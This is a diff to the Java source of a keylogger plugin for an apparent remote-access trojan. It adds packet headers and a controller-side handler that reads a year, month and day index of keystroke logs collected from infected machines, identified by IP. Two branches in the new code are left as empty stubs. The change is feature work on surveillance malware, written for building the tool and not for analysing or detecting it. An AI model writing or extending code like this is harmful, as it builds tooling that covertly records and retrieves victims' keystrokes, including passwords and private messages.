@@ -4,7 +4,9 @@ import java.awt.event.ActionListener;
 import java.io.DataInputStream;
 import java.io.File;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 import javax.swing.ImageIcon;
 
@@ -24,6 +26,8 @@ public class KeyloggerPlugin extends RATPlugin {
 	public static final byte KEY_HEADER = 121;
 	public static final byte TITLE_HEADER = 122;
 	public static final byte STATUS_HEADER = 123;
+	public static final byte LOGS_HEADER = 124;
+	public static final byte LOG_HEADER = 125;
 	
 	public static RATControlMenuEntry entry;
 	
@@ -72,6 +76,38 @@ public class KeyloggerPlugin extends RATPlugin {
 					}
 				}
 			}
+		} else if (event.getPacket().getHeader() == LOGS_HEADER) {
+			PanelKeylogger panel = (PanelKeylogger)entry.instances.get(event.getServer().getIP());
+			
+			Map<String, Map<String, List<String>>> mainList = new HashMap<String, Map<String, List<String>>>();
+			
+			int years = dis.readInt();
+			
+			for (int i = 0; i < years; i++) {
+				String year = dis.readUTF();
+				
+				Map<String, List<String>> list = new HashMap<String, List<String>>();
+				
+				mainList.put(year, list);
+				
+				int months = dis.readInt();
+				
+				for (int l = 0; l < months; l++) {
+					List<String> daysList = new ArrayList<String>();
+					list.put(dis.readUTF(), daysList);
+					
+					int days = dis.readInt();
+					for (int m = 0; m < days; m++) {
+						daysList.add(dis.readUTF());
+					}
+				}
+			}
+			
+			if (panel != null) {
+				
+			}
+		} else if (event.getPacket().getHeader() == LOG_HEADER) {
+			
 		}
 	}
 
